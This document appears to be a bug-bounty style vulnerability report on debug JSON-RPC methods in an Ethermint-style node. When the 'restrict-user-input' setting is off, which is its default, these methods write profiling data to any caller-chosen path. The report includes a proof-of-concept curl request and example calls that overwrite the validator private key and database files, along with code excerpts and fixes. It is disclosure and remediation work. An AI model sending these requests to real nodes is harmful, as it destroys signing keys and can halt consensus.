### Title
Unrestricted Arbitrary File Write via Debug JSON-RPC Methods When `restrict-user-input` Is Disabled by Default — (`rpc/namespaces/ethereum/debug/api.go`, `rpc/namespaces/ethereum/debug/utils.go`)

---

### Summary

The `debug` JSON-RPC namespace exposes multiple methods that accept a user-controlled file path and write profiling or tracing data to it. The path-restriction logic (`validatePath`) and the overwrite-prevention logic (`restrictedCreate`) are both gated behind the `JSONRPCRestrictUserInput` flag, which defaults to `false`. When the debug namespace is enabled without that flag, any client with access to the JSON-RPC endpoint can write arbitrary content to any file path the node process has write access to, including overwriting the validator private key, CometBFT config, or the application database — leading to node crash or consensus failure.

---

### Finding Description

**Root cause — `validatePath` is a no-op by default**

`validatePath` resolves the caller-supplied path but only enforces that it stays inside the node's data directory when `JSONRPCRestrictUserInput=true`: [1](#0-0) 

The flag defaults to `false`: [2](#0-1) 

**Root cause — `restrictedCreate` truncates existing files by default**

When the flag is off, `restrictedCreate` calls `os.Create`, which silently truncates any pre-existing file at the target path: [3](#0-2) 

**Affected RPC methods**

Every file-writing debug method routes through `validatePath` + `restrictedCreate`:

| Method | Code path |
|---|---|
| `debug_cpuProfile` / `debug_startCPUProfile` | `StartCPUProfile` → `validatePath` + `restrictedCreate` |
| `debug_blockProfile` / `debug_writeBlockProfile` | `writeProfile("block", …)` |
| `debug_goTrace` / `debug_startGoTrace` | `StartGoTrace` → `validatePath` + `restrictedCreate` |
| `debug_writeMemProfile` | `writeProfile("heap", …)` |
| `debug_mutexProfile` / `debug_writeMutexProfile` | `writeProfile("mutex", …)` | [4](#0-3) [5](#0-4) [6](#0-5) 

**The flag description itself acknowledges the risk but makes restriction opt-in** [7](#0-6) 

The comment reads: *"must be set to true if serving debug namespace to the public"* — but the default is `false`, so operators who enable the debug namespace without reading this note are immediately vulnerable.

---

### Impact Explanation

An attacker with access to the debug JSON-RPC endpoint can call, for example:

```
debug_writeMemProfile("/home/validator/.ethermintd/config/priv_validator_key.json")
debug_writeBlockProfile("/home/validator/.ethermintd/data/application.db/CURRENT")
```

- **Overwriting `priv_validator_key.json`** with pprof binary garbage destroys the validator's signing key. The node can no longer sign blocks, causing that validator to miss blocks and eventually be slashed or jailed. If the targeted node holds a large stake fraction, this can degrade or halt consensus.
- **Overwriting a LevelDB/RocksDB manifest or CURRENT file** in the application database corrupts the committed state store, causing the node to panic on the next block and halt.

Both outcomes map to the allowed High/Critical impact: *"valid unprivileged RPC submission… can halt the chain, corrupt committed state, or cause deterministic validator consensus failure"* and *"public JSON-RPC path exposes a reachable route to the impacts above."*

---

### Likelihood Explanation

- The `debug` namespace is **not** in the default API list (`["eth", "net", "web3"]`), so it must be explicitly enabled. [8](#0-7) 

- However, operators running infrastructure that needs tracing or profiling (e.g., performance debugging, incident response) routinely enable it. The flag description warns about the risk but does not enforce safe defaults — `RestrictUserInput` is `false` out of the box.
- Once the debug namespace is reachable from a public or semi-public network interface, **no authentication is required** to call these methods; any HTTP client can invoke them.
- Likelihood is **medium**: requires one operator misconfiguration (enabling debug without `restrict-user-input=true`), but that misconfiguration is easy to make and the documentation warning is easy to miss.

---

### Recommendation

1. **Flip the default**: Change `RestrictUserInput` to `true` in `DefaultJSONRPCConfig()`. Operators who need unrestricted paths for local use can explicitly opt out.
2. **Enforce at namespace registration time**: When the `debug` namespace is added to the API list, emit a startup error or at minimum a prominent warning if `RestrictUserInput` is `false`.
3. **Separate the flag from the namespace**: Consider requiring `restrict-user-input=true` as a hard prerequisite for registering the `debug` namespace at all, rather than a soft advisory.

---

### Proof of Concept

```bash
# Node has debug namespace enabled, restrict-user-input=false (default)
# Attacker overwrites the validator key with pprof heap data:
curl -X POST http://<node-rpc>:8545 \
  -H "Content-Type: application/json" \
  -d '{
    "jsonrpc":"2.0",
    "method":"debug_writeMemProfile",
    "params":["/home/validator/.ethermintd/config/priv_validator_key.json"],
    "id":1
  }'

# Result: priv_validator_key.json is truncated and overwritten with binary
# pprof heap data. The node can no longer sign blocks. On next restart or
# block proposal attempt, the validator fails to load its key and halts.
```

The `writeProfile` call reaches `restrictedCreate` → `os.Create(fp)` which truncates the target file unconditionally, then writes the pprof payload into it. [9](#0-8)

```go
func validatePath(ctx *server.Context, file string) (string, error) {
	fp, err := ExpandHome(file)
	if err != nil {
		return "", err
	}
	fp, err = filepath.Abs(fp)
	if err != nil {
		return "", err
	}
	if ctx.Viper.GetBool(srvflags.JSONRPCRestrictUserInput) {
		absDataDir, err := filepath.Abs(ctx.Config.RootDir)
		if err != nil {
			return "", err
		}
		realDataDir, err := filepath.EvalSymlinks(absDataDir)
		if err != nil {
			return "", err
		}
		// Resolve parent dir symlinks; the file itself may not exist yet.
		realParent, err := filepath.EvalSymlinks(filepath.Dir(fp))
		if err != nil {
			return "", err
		}
		fp = filepath.Join(realParent, filepath.Base(fp))
		if !strings.HasPrefix(fp, realDataDir+string(filepath.Separator)) {
			return "", errors.New("file path must be in the data directory")
		}
		// Reject a pre-existing symlink at the final component.
		if fi, err := os.Lstat(fp); err == nil && fi.Mode()&os.ModeSymlink != 0 {
			return "", errors.New("file path must not be a symlink")
		}
	}
	return fp, nil
```

```go
func restrictedCreate(ctx *server.Context, fp string) (*os.File, error) {
	if ctx.Viper.GetBool(srvflags.JSONRPCRestrictUserInput) {
		return os.OpenFile(fp, os.O_RDWR|os.O_CREATE|os.O_EXCL, 0o666)
	}
	return os.Create(fp)
}
```

```go
// writeProfile writes the data to a file
func writeProfile(name, file string, ctx *server.Context, log log.Logger) error {
	p := pprof.Lookup(name)
	log.Info("Writing profile records", "count", p.Count(), "type", name, "dump", file)
	fp, err := validatePath(ctx, file)
	if err != nil {
		return err
	}
	f, err := restrictedCreate(ctx, fp)
	if err != nil {
		return err
	}

	if err := p.WriteTo(f, 0); err != nil {
		if err := f.Close(); err != nil {
			return err
		}
		return err
	}

	return f.Close()
}
```

```go
func (a *API) StartCPUProfile(file string) error {
	a.logger.Debug("debug_startCPUProfile", "file", file)
	a.handler.mu.Lock()
	defer a.handler.mu.Unlock()

	switch {
	case isCPUProfileConfigurationActivated(a.ctx):
		a.logger.Debug("CPU profiling already in progress using the configuration file")
		return errors.New("CPU profiling already in progress using the configuration file")
	case a.handler.cpuFile != nil:
		a.logger.Debug("CPU profiling already in progress")
		return errors.New("CPU profiling already in progress")
	default:
		fp, err := validatePath(a.ctx, file)
		if err != nil {
			a.logger.Debug("failed to get filepath for the CPU profile file", "error", err.Error())
			return err
		}
		f, err := restrictedCreate(a.ctx, fp)
		if err != nil {
			a.logger.Debug("failed to create CPU profile file", "error", err.Error())
			return err
		}
		if err := pprof.StartCPUProfile(f); err != nil {
			a.logger.Debug("cpu profiling already in use", "error", err.Error())
			if err := f.Close(); err != nil {
				a.logger.Debug("failed to close cpu profile file")
				return stderrors.Wrap(err, "failed to close cpu profile file")
			}
			return err
		}

		a.logger.Info("CPU profiling started", "profile", file)
		a.handler.cpuFile = f
		a.handler.cpuFilename = file
		return nil
	}
}
```

```go
func (a *API) StartGoTrace(file string) error {
	a.logger.Debug("debug_startGoTrace", "file", file)
	a.handler.mu.Lock()
	defer a.handler.mu.Unlock()

	if a.handler.traceFile != nil {
		a.logger.Debug("trace already in progress")
		return errors.New("trace already in progress")
	}

	fp, err := validatePath(a.ctx, file)
	if err != nil {
		a.logger.Debug("failed to validate trace file path", "error", err.Error())
		return err
	}

	f, err := restrictedCreate(a.ctx, fp)
	if err != nil {
		a.logger.Debug("failed to create go trace file", "error", err.Error())
		return err
	}
	if err := trace.Start(f); err != nil {
		a.logger.Debug("Go tracing already started", "error", err.Error())
		if err := f.Close(); err != nil {
			a.logger.Debug("failed to close trace file")
			return stderrors.Wrap(err, "failed to close trace file")
		}
		return err
	}
	a.handler.traceFile = f
	a.handler.traceFilename = file
	a.logger.Info("Go tracing started", "dump", a.handler.traceFilename)
	return nil
```
